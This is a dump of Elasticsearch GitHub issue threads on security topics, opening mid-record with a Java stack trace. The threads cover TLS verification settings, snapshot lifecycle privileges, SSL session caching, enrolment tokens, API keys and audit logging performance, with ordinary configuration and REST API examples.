       app//org.elasticsearch.action.ActionListener$1.onResponse(ActionListener.java:63)
       org.elasticsearch.xpack.security.authz.RBACEngine.authorizeIndexActionName(RBACEngine.java:337)
       org.elasticsearch.xpack.security.authz.RBACEngine.authorizeIndexAction(RBACEngine.java:310)
       org.elasticsearch.xpack.security.authz.AuthorizationService.authorizeAction(AuthorizationService.java:283)
       org.elasticsearch.xpack.security.authz.AuthorizationService.maybeAuthorizeRunAs(AuthorizationService.java:248)
       org.elasticsearch.xpack.security.authz.AuthorizationService.lambda$authorize$1(AuthorizationService.java:212)
       org.elasticsearch.xpack.security.authz.AuthorizationService$$Lambda$4806/0x0000000801606018.accept(Unknown Source)
       app//org.elasticsearch.action.ActionListener$1.onResponse(ActionListener.java:63)
       app//org.elasticsearch.action.support.ContextPreservingActionListener.onResponse(ContextPreservingActionListener.java:43)
       org.elasticsearch.xpack.security.authz.RBACEngine.lambda$resolveAuthorizationInfo$1(RBACEngine.java:123)
       org.elasticsearch.xpack.security.authz.RBACEngine$$Lambda$4808/0x0000000801606478.accept(Unknown Source)
       app//org.elasticsearch.action.ActionListener$1.onResponse(ActionListener.java:63)
       org.elasticsearch.xpack.security.authz.store.CompositeRolesStore.getRoles(CompositeRolesStore.java:274)
       org.elasticsearch.xpack.security.authz.RBACEngine.getRoles(RBACEngine.java:129)
       org.elasticsearch.xpack.security.authz.RBACEngine.resolveAuthorizationInfo(RBACEngine.java:117)
       org.elasticsearch.xpack.security.authz.AuthorizationService.authorize(AuthorizationService.java:214)
       org.elasticsearch.xpack.security.transport.ServerTransportFilter$NodeProfile.lambda$inbound$1(ServerTransportFilter.java:129)
       org.elasticsearch.xpack.security.transport.ServerTransportFilter$NodeProfile$$Lambda$4760/0x0000000801604bd8.accept(Unknown Source)
       app//org.elasticsearch.action.ActionListener$1.onResponse(ActionListener.java:63)
       org.elasticsearch.xpack.security.authc.AuthenticationService$Authenticator.lambda$authenticateAsync$2(AuthenticationService.java:323)
       org.elasticsearch.xpack.security.authc.AuthenticationService$Authenticator$$Lambda$4762/0x0000000801605bb8.accept(Unknown Source)
       org.elasticsearch.xpack.security.authc.AuthenticationService$Authenticator.lambda$lookForExistingAuthentication$6(AuthenticationService.java:384)
       org.elasticsearch.xpack.security.authc.AuthenticationService$Authenticator$$Lambda$4763/0x0000000801605df0.run(Unknown Source)
       org.elasticsearch.xpack.security.authc.AuthenticationService$Authenticator.lookForExistingAuthentication(AuthenticationService.java:395)
       org.elasticsearch.xpack.security.authc.AuthenticationService$Authenticator.authenticateAsync(AuthenticationService.java:320)
       org.elasticsearch.xpack.security.authc.AuthenticationService$Authenticator.access$000(AuthenticationService.java:261)
       org.elasticsearch.xpack.security.authc.AuthenticationService.authenticate(AuthenticationService.java:173)
       org.elasticsearch.xpack.security.transport.ServerTransportFilter$NodeProfile.inbound(ServerTransportFilter.java:120)
       org.elasticsearch.xpack.security.transport.SecurityServerTransportInterceptor$ProfileSecuredRequestHandler.messageReceived(SecurityServerTransportInterceptor.java:313)
       app//org.elasticsearch.transport.RequestHandlerRegistry.processMessageReceived(RequestHandlerRegistry.java:72)
       app//org.elasticsearch.transport.TransportService$8.doRun(TransportService.java:800)
       app//org.elasticsearch.common.util.concurrent.ThreadContext$ContextPreservingAbstractRunnable.doRun(ThreadContext.java:737)
       app//org.elasticsearch.common.util.concurrent.AbstractRunnable.run(AbstractRunnable.java:37)
       java.base@15/java.util.concurrent.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:1130)
       java.base@15/java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:630)
       java.base@15/java.lang.Thread.run(Thread.java:832)
```
</details>","Pinging @elastic/es-distributed (Team:Distributed)Pinging @elastic/es-security (Team:Security)We've discussed this inside the distrib team (prob 2 months ago). 
They weren't convinced that performance problems in general are a good reason for changing the networking threading model.
There is already logging for slow network threads, and the mitigation can be to use more of them transport threads.
But, in Security, If we expect stuff blocks or takes a long time, we can fork the same way we fork for LDAP authn or even for a get doc from the .security index.",no,">enhancement,:Security/Authorization,team-discuss,Team:Security,"
elastic/elasticsearch,1182997152,"`xpack.security.http.ssl.verification_mode` is missing from the docs","### Description

- `xpack.security.http.ssl.verification_mode` is missing from the docs for 8.1. Reference https://www.elastic.co/guide/en/elasticsearch/reference/8.1/security-settings.html .
- But in fact this property exists, refer to the third point of `Resolution` in https://www.elastic.co/guide/en/elasticsearch/reference/8.1/trb-security-setup.html, but there is no place to set this property point to its meaning.
- ![image](https://user-images.githubusercontent.com/20187731/160345023-c8e6d43c-dc01-43f8-aa99-f12d727d5b6f.png)
- In conclusion, I hope https://www.elastic.co/guide/en/elasticsearch/reference/8.1/security-settings.html can provide a description of this property.
","Pinging @elastic/es-docs (Team:Docs)Pinging @elastic/es-security (Team:Security)The fact that this isn't documented is intentional, because it _shouldn't_ ever be set, and the fact that `setup-passwords` uses it is really a bug.
However, given we mention it in 1 part of the docs, and it is technically a valid setting (even if it shouldn't be used), we probably should document it (even if only to say that it is only useful for `setup-passwords`)> The fact that this isn't documented is intentional, because it _shouldn't_ ever be set, and the fact that `setup-passwords` uses it is really a bug. However, given we mention it in 1 part of the docs, and it is technically a valid setting (even if it shouldn't be used), we probably should document it (even if only to say that it is only useful for `setup-passwords`)

- So, is there an improvement plan for docker compose for this page? ( https://www.elastic.co/guide/en/elastic-stack-get-started/8.1/get-started-stack-docker.html#docker-compose-file ) No one seems to notice this within https://github.com/elastic/elasticsearch/issues/81133 .
- ![image](https://user-images.githubusercontent.com/20187731/160422083-0bb91801-e29c-4688-b3ea-7eb66716f8a4.png)
@tvernum, should we remove that setting from the [example](https://www.elastic.co/guide/en/elastic-stack-get-started/8.1/get-started-stack-docker.html#docker-compose-file) `docker-compose.yml` file? We can document it in the security settings, but if it shouldn't be set, then I think that it makes sense to remove it from the example.@ywangd, can I get your input on this issue? Should we document `xpack.security.http.ssl.verification_mode` in the secure settings page and also remove it from the [example](https://www.elastic.co/guide/en/elastic-stack-get-started/8.1/get-started-stack-docker.html#docker-compose-file) `docker-compose.yml` file?@lockewritesdocs Yes it can be removed from the `docker-compose.yml`. When ES running as a server, this setting is completely useless and should not be set at all. Unfortunately, the setup-passwords tool shares the same settings with the ES server but running in a client mode. So it is useful only in this particular use case. Maybe in the long term, we should separate the settings used by the server from those for CLI tools. But for now documenting it explicilty and removing it from server side setting are the way to go.It turns out not to be _just_ setup-passwords. It looks like reset-password has inherited the same behaviour.

I would propose that we migrate away from relying on verification mode, and instead start trusting the actual HTTP server cert instead.
`CommandLineHttpClient.pinnedCaCertFingerprint` already does something like that. We probably don't want to do exactly that (because there's no requirement that a node have a copy of its CA, so we may not know the fingerprint of the CA), but we could verify that the node provided the same cert that is configured in `elasticsearch.yml` 

That would mean `verification_mode` is never needed anymore, and we can drop it everywhere, and simply document it as a ""this is valid, but unncessary & discouraged"".
I just realised this issue doesn't explain why that setting shouldn't be set. I've explained it elsewhere (possibly on other issues) but it's worth covering here since this has become the main issue for tracking the lack of docs.

----

`verification_mode` defines how to verify the certificates presented by the other party in the SSL/TLS connection.

For TLS _clients_ there are 3 values, all of which have meaning, and can be useful (although one of them is particularly dangerous and should be used with extreme caution).
- `full` verifies that the certificate is valid (e.g. it is within the `not_before` and `not_after` dates), chains to a trusted anchor (CA), and has a _Subject Alternative Name_ (hostname) that matches the address to which the connection was intended
- `certificate` checks validity & trust chain (CA) but does not check the hostname (_Subject Alternative Name_).
- `none` checks nothing - neither validity, trust, or hostname. This is very dangerous, are ought to be avoided (but is occasionally necessary for debugging purposes, or to temporarily work around a transient issue such as expired certificates - but fixing the certificates is a much idea).

For TLS _servers_ there is no such thing as hostname verification of the client's certificate. The server didn't open the connection so it doesn't have an address to check against. (Some servers do non-standard checks involving reverse DNS lookups, but that's not part of TLS or HTTPS).
So, when we are configuring TLS for a server, the `full` and `certificate` verification modes are identical. That means there are only 2 meaningful options - `full` and `none`.
However, client certificates are entirely optional in TLS. By default, they are not used, and in Elasticsearch you can set the `client_authentication` setting to `none`, `optional` or `required`.

Because of that, there's no case where setting verification mode to `none` makes sense.
If you configure:
```
xpack.security.http.ssl.enabled: true
xpack.security.http.ssl.client_authentication: required
xpack.security.http.ssl.verification_mode: none
```
It means, _Clients must provide a certificate, but I don't care what certificate it is_. That's nonsense. Don't do that. If you don't care about the certs, don't require them.

If you configure:
```
xpack.security.http.ssl.enabled: true
xpack.security.http.ssl.client_authentication: none
xpack.security.http.ssl.verification_mode: none
```
Then there are no certificates to verify (because client authentication is off), so the verification_mode is useless.

Given that `xpack.security.http.ssl` configures a _server_ with configurable options for `client_authentication`, there is no need to have a configurable `verification_mode`.

----

The minor issue we have is that `setup-passwords` and `reset-password` configure their HTTPS client using the settings from `xpack.security.http.ssl`. That means that in this very specific case, `xpack.security.http.ssl` is used for both client and server settings. That was a bad idea, and we should fix it.
@tvernum thank you for the explanation. I have a followup question about mTLS to Elasticsearch.

In Kibana 8.3 documentation, it describes using a TLS client for Kibana authentication, and an Elasticsearch PKI realm for authorization. In other words, use role mapping from the Kibana TLS client's Subject DN to the `kibana_system` role.
- https://www.elastic.co/guide/en/kibana/8.3/elasticsearch-mutual-tls.html

In that scenario, the Kibana documention says to set `xpack.security.http.ssl.client_authentication` to `optional`. There is no mention of `xpack.security.http.ssl.verification_mode`, so I assume it would default to `full`.

What is design intent if `xpack.security.http.ssl.verification_mode` were changed to `certificate`? Is it design intent for `full` and `certificate` to behave the same way in that documented Kibana mTLS use case?>  Is it design intent for full and certificate to behave the same way in that documented Kibana mTLS use case?

Kibana mTLS doesn't use client certificates between Kibana and ES (hence needing to set `client_authentication` to `optional`). So the value of `verification_mode` has no consequence to Kibana mTLS.

",no,">docs,:Security/TLS,Team:Docs,Team:Security,"
elastic/elasticsearch,786333688,"Expand `manage_slm` privilege","The description from [SLM with Security](https://www.elastic.co/guide/en/elasticsearch/reference/current/slm-and-security.html) is a bit unclear to me.
The list mentions privileges to create and delete snapshots (`cluster:admin/snapshot/*`) when working with SLM, but from my reading of the SLM code that is not necessary. The internal client used by the SLM tasks runs under sufficient privileges to create and remove snapshots, irrespective of the users privileges.

I think we should proceed to remove the `cluster:admin/snapshot/*` mention in the docs.
Maybe someone from @elastic/es-core-features can verify my theory.

","Pinging @elastic/es-security (Team:Security)Pinging @elastic/es-docs (Team:Docs)> The internal client used by the SLM tasks runs under sufficient privileges to create and remove snapshots, irrespective of the users privileges.

I tested this in a 8.0 snapshot build, and it looks like the `cluster:admin/snapshot/*` privilege is still required for the user creating the SLM policy. Otherwise, SLM will fail to take the snapshots. It looks like @dakrone added the `cluster:admin/snapshot/*` bit  with  #47545. He may have some additional context.

Here's the reproduction steps for my test:

1. As the `elastic` user, create a `my_test` role with only the `manage_slm` cluster privilege:

```
POST _security/role/my_test
{
  ""cluster"": [ ""manage_slm"" ],
  ""indices"": [ ]
}
```

2. As the `elastic` user, create a `test` user with the `my_test` role:

```
POST _security/user/test
{
  ""password"" : ""..."",
  ""roles"" : [ ""my_test"" ]
}
```

3. As the `elastic` user, register a snapshot repository:

```
PUT _snapshot/my_repository
{
  ""type"": ""fs"",
  ""settings"": {
    ""location"": ""my_repo_location""
  }
}
```

4. As the `test` user, put a SLM policy that uses the repo. This policy should run every 15 minutes.

```
PUT _slm/policy/test-snapshot-policy
{
  ""schedule"": ""0 15 * * * ?"", 
  ""name"": ""<15m-snap-{now}>"", 
  ""repository"": ""my_repository""
}
```

5. Wait 15 minutes or use the execute snapshot lifecycle policy API to force SLM to create a snapshot. You can use either the `test` or `elastic` user.

```
POST _slm/policy/test-snapshot-policy/_execute
```

6. Check the SLM stats as either the `test` or `elastic` user:

```
GET _slm/stats
```

The response indicates the snapshot failed.

```
{
  ""retention_runs"" : 0,
  ""retention_failed"" : 0,
  ""retention_timed_out"" : 0,
  ""retention_deletion_time"" : ""0s"",
  ""retention_deletion_time_millis"" : 0,
  ""total_snapshots_taken"" : 0,
  ""total_snapshots_failed"" : 1,
  ""total_snapshots_deleted"" : 0,
  ""total_snapshot_deletion_failures"" : 0,
  ""policy_stats"" : [
    {
      ""policy"" : ""test-snapshot-policy"",
      ""snapshots_taken"" : 0,
      ""snapshots_failed"" : 1,
      ""snapshots_deleted"" : 0,
      ""snapshot_deletion_failures"" : 0
    }
  ]
}
```

You can repeat steps 5 & 6. Each time will result in snapshot failure.

7. As the `elastic` user, add `cluster:admin/snapshot/*` to the `my-test` role:

```
POST _security/role/my_test
{
  ""cluster"": [ ""manage_slm"",  ""cluster:admin/snapshot/*""],
  ""indices"": [ ]
}
```

8. As the `test` user, re-put the SLM policy. This will ensure the policy runs with the new privileges:

```
PUT _slm/policy/test-snapshot-policy
{
  ""schedule"": ""0 15 * * * ?"", 
  ""name"": ""<15m-snap-{now}>"", 
  ""repository"": ""my_repository""
}
```

9. Wait 15 minutes or use the execute snapshot lifecycle policy API to force SLM to create a snapshot.

```
POST _slm/policy/test-snapshot-policy/_execute
```

10. Check the SLM stats:

```
GET _slm/stats
```

The response now indicates a successful snapshot was taken:

```
{
  ""retention_runs"" : 0,
  ""retention_failed"" : 0,
  ""retention_timed_out"" : 0,
  ""retention_deletion_time"" : ""0s"",
  ""retention_deletion_time_millis"" : 0,
  ""total_snapshots_taken"" : 1,
  ""total_snapshots_failed"" : 1,
  ""total_snapshots_deleted"" : 0,
  ""total_snapshot_deletion_failures"" : 0,
  ""policy_stats"" : [
    {
      ""policy"" : ""test-snapshot-policy"",
      ""snapshots_taken"" : 1,
      ""snapshots_failed"" : 1,
      ""snapshots_deleted"" : 0,
      ""snapshot_deletion_failures"" : 0
    }
  ]
}
```It does seem odd that we use the `cluster:admin/snapshot/*` action(s) as the privilege here. While it is supported, I would think most users would use a ""named"" privilege instead: https://www.elastic.co/guide/en/elasticsearch/reference/master/security-privileges.html#privileges-list-cluster

As is, this sorta feels like a workaround. Maybe  a `manage_snapshot` or similar privilege is warranted? My assumptions about how often users use actions as privileges could be off though.I think @jrodewig is right. The privileges are still needed with the current code. The logic in [`ClientHelper#executeWithHeadersAsync`](https://github.com/elastic/elasticsearch/blob/master/x-pack/plugin/core/src/main/java/org/elasticsearch/xpack/core/ClientHelper.java#L185-L195) is to execute with `origin` if no security header is passed in. However, security header does get passed in from [`SnapshotLifecycleTask #maybeTakeSnapshot`](https://github.com/elastic/elasticsearch/blob/7.11/x-pack/plugin/ilm/src/main/java/org/elasticsearch/xpack/slm/SnapshotLifecycleTask.java#L88-L89). The security header is from the SLM policy metadata which is created the policy is created. With James's example, it represents the authentication info of user `test`. 

So, unless a policy is created with no authentication, the task will always be executed with the privileges of the user who creates the policy. I am not entirely sure why we also set an `origin` of `index_lifecycle` here. The only usage that I can think of is to support a cluster migrating from ""security-off"" to ""security-on"". If there are existing SLM policies with the open cluster, they can still function once the cluster is secured. 

I also agree the recommendation of using raw action names is off. We don't currently have a `manage_snapshot` privilege, only `create_snapshot` and `monitor_snapshot` and none of them include privilege to delete a snapshot. So if the intention is allow full access to snapshots, it does seem we need a new `manage_snapshot` privilege.Thank you @jrodewig for the investigation! It was on me to verify, thank you for your time.

Thanks for pitching in @ywangd .

I misread the code.
But, note that deleting snapshots is always performed under the `index_lifecycle` origin, so no delete privileges are required on the user creating the policy. Also, note that `manage_slm` as a standalone privilege is effectively useless, because if you edit an SLM policy, you'll update the headers, and if you don't have the ""create snapshot privilege"" you'll ruin every policy you touch.

@ywangd I think we should add the privileges to create (and delete snapshots) to the `manage_slm` privilege. WDYT Yang?> I think we should add the privileges to create (and delete snapshots) to the manage_slm privilege
>
I am not sure what was the original intention of having `manage_slm` as a separate privilege. Is it to isolate the policy management from the actual snapshot manageent? i.e. people who manages policy should not automatically gets to manually create (or delete) snapshots. If this is the intention and still stands, I wonder whether always executing with the `index_lifecycle` origin is a viable alternative (as you mentioned, the deletion is already handled this way)?> people who manages policy should not automatically gets to manually create (or delete) snapshots. If this is the intention and still stands, I wonder whether always executing with the index_lifecycle origin is a viable alternative

The intention doesn't make much sense because if you can create an SLM policy but not create snapshots, you create a policy that does a snapshot 1 minute from now, circumventing your restriction. In addition, it's preferable to run the snapshots under the owner user context for auditing purposes (or better attribution in general). > > people who manages policy should not automatically gets to manually create (or delete) snapshots. If this is the intention and still stands, I wonder whether always executing with the index_lifecycle origin is a viable alternative
> 
> The intention doesn't make much sense because if you can create an SLM policy but not create snapshots, you create a policy that does a snapshot 1 minute from now, circumventing your restriction. In addition, it's preferable to run the snapshots under the owner user context for auditing purposes (or better attribution in general).

Makes sense. I agree `manage_slm` should be expanded to include create snapshot at least. We could also include delete if we are happy about the behaviour change. I can see at least three benefits:
1. Make `manage_slm` privilege more useful
2. Simplify the doc so it can drop the bit about adding `cluster:admin/snapshot/*`
3. `cluster:admin/snapshot/*` grants more than just create (and delete), e.g. it covers restore and mount searchable snapshot. I don't think they are all related to SLM, so it is better if we can tighten up `manage_slm`.Since the current docs are correct, I changed the title and removed the `>docs` label. Feel free to re-add once these changes are made. Thanks!",no,":Data Management/ILM+SLM,:Security/Authorization,Team:Data Management,Team:Security,"
elastic/elasticsearch,1374875934,"PoC for pre-authorizing child transport actions","This PR is a PoC on how we could additionally improve authorization performance 
by avoiding authorizing some of the transport child actions on every node. 
Primarily it focuses on “_true child actions_”, the ones which are accessing 
just a subset of parent’s indices. One example of such action is search action 
and its child phase actions, e.g. `indices:data/read/search` and children 
`indices:data/read/search[phase/query]`, 
`indices:data/read/search[phase/fetch/id]`, etc...

Some optimizations already exist which allow the children of authorized 
parent actions  _on the same node_ to skip authorization ([#77221](https://github.com/elastic/elasticsearch/pull/77221)). 
This PR adds ability to do the same optimization, but for child actions 
that are executed on remote nodes in the same cluster.


","@elasticmachine update branch@elasticmachine run elasticsearch-ci/bwc",yes,">enhancement,>non-issue,:Security/Authorization,Team:Security,v8.6.0,"
elastic/elasticsearch,317447556,"bulk change all permissions for a set of users in a realm","*Original comment by @hub-cap:*

From a slack conversation... LINK REDACTED

```
*Alex Brasetvik* For Found^WCloud we're going to change the memory-to-storage-ratio from 1:8 to 1:16. 
Behind the scenes we'll have a hard-quota of 1:24 to deal with segment merges and other temporary increases. 
We don't have anything today to prevent a cluster from growing once it has hit its soft limit. 
The read-only block wouldn't help, since it's preventing deletes. 
Would it make sense to have such a block in core? We were originally planning on using Shield for it (by rewriting roles)
*Shay Banon* @alexb: shield is probably the way to go
would be a shame to continue to complicate the blocks infra
```

We need a way to `readonly` a set of users easily. Currently we would be able to modify the users in esusers but that is because we control it. Moving forward, the found UI/control infra wont be the only place that you can modify ACLs (shield UI or shield API). Can we make a way to easily turn a realm into readonly, or make all the users for that realm readonly (of course we can generalize to ""match a generic permission set"", not just readonly). 

Of course, bonus points for being able to `un-readonly` this after the fact. Like remove this limitation and all existing permissions are restored so Found does not have to store them internally between these state changes.


","*Original comment by @skearns64:*

I'm +1 on this functionality being part of Shield. 

For the Found use-case (preventing a cluster from running out of disk), is the goal as simple as forcing all users of an entire realm (the `esnative` realm) to be read-only? 
Or do we also need to do something to allow RD (of CURD) at the document and/or index level? 
*Original comment by @hub-cap:*

we will need to force a realm readonly so the Found user cannot modify it, yes. But we will also need to make sure that all users in that role can read and delete but not index. So I think its both readonly'ing a realm and limiting the permissions for all users on that realm too.
*Original comment by @hub-cap:*

also, we don't have any time period for this but the earlier its impl'd on your end the nicer itll be on our end. We have not yet impl'd the ""readonly"" of `esusers` but its def been on our roadmap (a few peoples brains) for a while now.
*Original comment by @alexbrasetvik:*

Yes, we'd want to allow reads and deletes, but not index/update/create operations, so the RD. :)

It should be possible to modify the esusers Shield roles while in this mode, e.g. to prevent something crazy from ingesting until you can get at it and fix it. (Which may not necessarily be immediately after you've deleted an index)

Roles we define on-disk (through Cloud's control plane) should always overrule anything the esusers-realm can do. I can imagine this being useful e.g. for allowing search requests to hit nodes in a cluster without a quorum as well.

We also need to be able to subtract permissions from a role, so we need not resolve everything every role does to be able to rewrite it.

Just thinking out loud, what about something like this, in `roles.yaml`:

```
esusers:
   deny:
       indices:
           '*':
               - create_index
               - index
```

(… leaving exact roles for another discussion)

Whatever a role defined through esusers define, it now can't contain any of these actions. (`index` would expand to all the necessary `bulk` and `update` actions as well)
*Original comment by @uboness:*

copy my view on `deny` as expressed in slack:

> he model that we have today only allows for opting-in to actions. We initially had some discussions whether we would also enable to opt-out of actions, but the decisions was not to do so for two main reasons, the first, is additional complexity on the implementation side, but that was not the main driver… the main driver was actually just security. 
> 
> opt-in only is the appropriate way to follow the principle of least privilege, ppl don’t necessarily know nor are forced to look up every possible privilege that users may be granted. This can easily lead to misconfiguration on their part… out of naivety once we expose this, you will see users provide the following privilege `+all -write` thinking that they just defined a read only privilege… not knowing that they actually granted the user full admin rights on the index/cluster for this reason, the safest and most natural/intuitive approach is to only opt-in now.. I’m +1 on forcing a “read-only” mode to users.. I didn’t read through all the thread and the tickets… but we can certainly talk about it to me it relates to a feature I wanted to add for a long time which is the ability to block users but with that, I’d try to avoid supporting opting-out of actions as a feature
*Original comment by @alexbrasetvik:*

Good point. What if we flip it, to something like `only_allow`. We'd then provide a list that doesn't include index operations.
*Original comment by @jaymode:*

Thinking of a simplistic solution, we could have an API that takes in:
- list of users (or pattern?)
- allowed operations (action or privileges like `read`). Will probably need distinction between cluster and index operations but don't think we should specify allowed indices in this API.

This will then be checked at the first step of authorization. If the user is in the list or matches the pattern, the action requested will be checked against the allowed operations and only if it is allowed will authorization continue. This allows us to essentially intersect the allowed operation with the users roles.

To remove this restriction, issue a DELETE request to API.

One issue is there is no distinction between users with the same username in different realms, which I think should be ok.
*Original comment by @uboness:*

That's what I had in mind as well, this needs to be a phase before the normal role based authorisation phase. We can potentially apply this to roles as well (role name patterns). The only thing that we need to carefully think about is where are we going to store this. Is it persisted at all, or is it just in-memory, meaning you're losing this ""blocks"" on node restart.
",no,">feature,:Security/Authorization,team-discuss,Team:Security,"
elastic/elasticsearch,349368247,"Add configuration for SSL Session cache","`javax.net.ssl.SSLSessionContext` has two methods to control caching:
- `setSessionTimeout`
- `setSessionCacheSize`

In `sun.security.ssl.SSLSessionContextImpl` defaults are:
- 24h
- unbounded cache (the cache uses `SoftReference`)

In theory the use of soft references should limit the memory impacts of this cache. In practice it has at least 3 signficant problems
1. it can trigger frequent GC pauses.
2. it suffers from terrible performance behaviours immediately after a GC, when the very large cache is suddenly filled with collected objects, and the `expungeExpiredEntries`/`emptyQueue` methods have to walk the whole cache and clear (probably) every entry.
3. the SoftReferences are all equal value candidates for GC regardless of whether they were 1s old or 23.5h old, so if a GC is triggered all SSL sessions are likely to be expunged, even if though we know that some sessions are more valuable (more recent) than others.

These problems are more likely to occur if an ES server is subjected to many, standalone SSL sessions, such as cyclic monitoring with short lived processes (e.g. using curl with cron).

Long running processes that use a shared client (such as X-Pack monitoring's HTTP exporter) tend not to cause this problem because they will utilise http-keep-alive and/or SSL session resumption to minimise the number of SSL sessions in use.
 
X-Pack should not rely on the JVM defaults for these cache settings as they have proven to be problematic in some cases.

I propose:
- We add configuration settings for both of these values
- We provide more sensible defaults for the configuration. Internally testing has suggested that even a relatively large cache value like 10,000 has a signficant improvement on affected clusters.
 ","Pinging @elastic/es-security> Long running processes that use a shared client (such as X-Pack monitoring's HTTP exporter) tend not to cause this problem because they will utilize HTTP-keep-alive and/or SSL session resumption to minimize the number of SSL sessions in use.

This may not be entirely true when you have many clients (say mobile devices) connecting and when they are doing SSL session resumption concurrently, it can cause performance bottlenecks. As for SSL session resumption, it tries to locate the earlier session from the cache during client hello and the way cache has been implemented causes this performance bottleneck. For reference: [JDK-8202086](https://bugs.openjdk.java.net/browse/JDK-8202086) and [source](https://github.com/frohoff/jdk8u-dev-jdk/blob/da0da73ab82ed714dc5be94acd2f0d00fbdfe2e9/src/share/classes/sun/security/ssl/ServerHandshaker.java#L541) where it accesses to locate session.

Once we expose these settings it's up to the deployment to configure them appropriately.Why do we need settings for this? Isn’t it enough to add sane default values to jvm.options? I also favor this because what do we do if a user sets these via system properties and we’ve also exposed settings?We don't have to expose it as configuration, but I think there's some value in it:

1. There isn't a system property for the cache expiry (""timeout""), so we need to configure it in code, or we don't configure it at all. And if we don't expose a configuration then it's not possible to change it from whatever default we decide on.
2. As far as I can tell (but I haven't done any direct testing yet) there's a cache per `SSLSessionContext`, so I think it's possible to set different configurations per xpack context. That is the cache for transport could be sized relative to your node count, and http could be sized differently. I don't know that we want to do that - maybe we do, it seems redundant to have a very large cache for transport, but simplicity might win.
 
/followWe used to have `shield.ssl.session.cache_size` and `shield.ssl.session.cache_timeout` settings but this also caused problems and was ultimately removed for 5.0. From the breaking changes docs:

> `shield.ssl.session.cache_size`::
The value for the SSL session cache size should be configured through the use of the system property `javax.net.ssl.sessionCacheSize`.
`shield.ssl.session.cache_timeout`::
The SSL session cache timeout being set incorrectly can negatively impact performance and was not widely used, so it has been removed and the default value of the JDK is used.

Given that they have caused problems in the past, I would make sure we consider this when making our decision.

> As far as I can tell (but I haven't done any direct testing yet) there's a cache per SSLSessionContext, so I think it's possible to set different configurations per xpack context.

There is a cache per context, but I think it would be a very advanced configuration to start sizing each cache independently.

> I also favor this because what do we do if a user sets these via system properties and we’ve also exposed settings?

**If** we do add these settings back, the order of defining the value should be (IMO):

1. setting value
2. system prop
3. default value that we choose

In terms of what I think we should do, I suggest that we start by adding a sane default in `jvm.options` and see how that works out. It is easier to add things later than take them away.We discussed this in the security team meeting and agree to proceed by adding a sensible default for cache size into jvm options.",no,">enhancement,:Security/TLS,Team:Security,"
elastic/elasticsearch,1325176072,"Generating enrolment token for Kibana should not require the CA key","When generating enrolment token for Kibana, ES needs to [compute the fingerprint of the HTTP CA cert](https://github.com/elastic/elasticsearch/blob/e94b4befc5f59db2c56eb6b042a735e77c77cd87/x-pack/plugin/security/src/main/java/org/elasticsearch/xpack/security/enrollment/BaseEnrollmentTokenGenerator.java#L54). This process really just requires the CA cert, not the CA key. But it [filters out](https://github.com/elastic/elasticsearch/blob/e94b4befc5f59db2c56eb6b042a735e77c77cd87/x-pack/plugin/security/src/main/java/org/elasticsearch/xpack/security/enrollment/BaseEnrollmentTokenGenerator.java#L39-L42) any certs without associated keys before the fingerprint calculation. Therefore, the process will throw the following error if the CA cert does not have an associated key in the keystore:

> Unable to create an enrollment token. Elasticsearch node HTTP layer SSL configuration Keystore doesn't contain any PrivateKey entries where the associated certificate is a CA certificate

This is not a problem when users fully rely on the security autoconfiguration to bootstrap the cluster because we keep both cert and key for the HTTP CA. But it can be an issue when users decide to configure the CA manually (and different) and then use the enrolment CLI/API. We can improve the user experience by not requiring CA key for generating Kibana enrolment token. Though technically it is possible for Kibana to just trust the leaf cert, we will still require a copy of the CA because all the toolings assume they are getting a fingerprint of CA instead of the leaf cert.","Pinging @elastic/es-security (Team:Security)Is there any workaround for this issue in the meantime?  I am hung up on this exact problem - I cannot get my es instance to generate a kibana enrollment token.  

I attempted to import the key using keytool, like this:
`keytool -importcert -noprompt -keystore certs/http.p12 -alias ca -file certs/ca/ca.key`
but it is rejected, keytool states that the ca alias already exists.  Which makes sense, because the http.p12 file was generated using bin/elasticsearch-certutil and the ca was specified as input via the --ca flag.@sunergeo 
> keytool states that the ca alias already exists

You can delete the existing ca entry with `keytool -delete`.

> import the key using keytool

The `keytool -importcert` command only works for certificate file, not private keys. You need convert the cert and key to pkcs12 keystore (with openssl pkcs command) and then import the store file with `keytool -importkeystore`.

Since what you have is a user question, and we'd like to direct these kinds of things to the [Elasticsearch forum](https://discuss.elastic.co/c/elasticsearch). If you have any follow-up questions, please stop by there. This allows us to use GitHub for verified bug reports, feature requests, and pull requests.

There's an active community in the [forum](https://discuss.elastic.co/c/elasticsearch) that should be able to help get an answer to your question. Thank you!",no,">enhancement,Team:Security,:Security/AutoConfiguration,"
elastic/elasticsearch,974709815,"Deprecate or warn for system indices in user-defined roles","This is a follow-up from a suggestion that @albertzaharovits made in https://github.com/elastic/elasticsearch/pull/74212.

If a user currently has an index permission in a user-defined role that specifies only system indices, do we need to issue a deprecation warning? Or should we 

We need to find out what the application behavior would be in this situation and determine whether or not we can successfully identify this situation. We don't want to issue warnings in cases where the index permission patterns can cover system indices as well as other indices; consider the trivial case of ""*"" for all indices, which should be allowed. But if a user has created an alternate permission for `.security-*` or `.kibana`, what will happen? Do we need to warn about this case or just let it fail silently?

It's possible that we already do some kind of checking or handling here, in which case we can close this issue.","Pinging @elastic/es-core-infra (Team:Core/Infra)Pinging @elastic/es-security (Team:Security)",no,">enhancement,:Core/Infra/Core,:Security/Authorization,Team:Core/Infra,Team:Security,"
elastic/elasticsearch,654116967,"Ability to clone granted API keys","The [grant API key API](https://github.com/elastic/elasticsearch/pull/52886) works for scenarios that have a user’s password or access token. This is ideal for Kibana alerting which grants API keys on behalf of other users.

However once an API key is granted, it can’t be cloned or used to grant another API key because the API doesn’t support a `grant_type` of API key.

Would it be possible to allow the cloning or granting of API keys from an API key that has already been granted?

The Kibana alerting team is experiencing [issues](https://github.com/elastic/kibana/issues/53868#issuecomment-624246568) with managing these keys when it comes to invalidating them after granting a new API key. The invalidation process in Kibana doesn’t consider if a one-off task is currently running and depends on the key. A feature like this would allow us to create a new key for each one-off task that is running and invalidate it immediately after the task is completed.","Pinging @elastic/es-security (:Security/Authentication)",no,">enhancement,:Security/Authentication,Team:Security,"
elastic/elasticsearch,416846154,"Audit Logging on the IO Thread Appears to Cause Instability","While investigating some test slowness/instability today I found that we are running audit logging (including flushing logs to disk) on the transport/IO-thread (the one(s) where the network `.select` calls happen).
This caused the select loop(s) to get blocked for an extended period of time every now and then leading to periods where the network IO was frozen. This is especially visible when running large bulk requests (in the test in question a bulk request of size 10k) (https://github.com/elastic/elasticsearch/issues/39575).

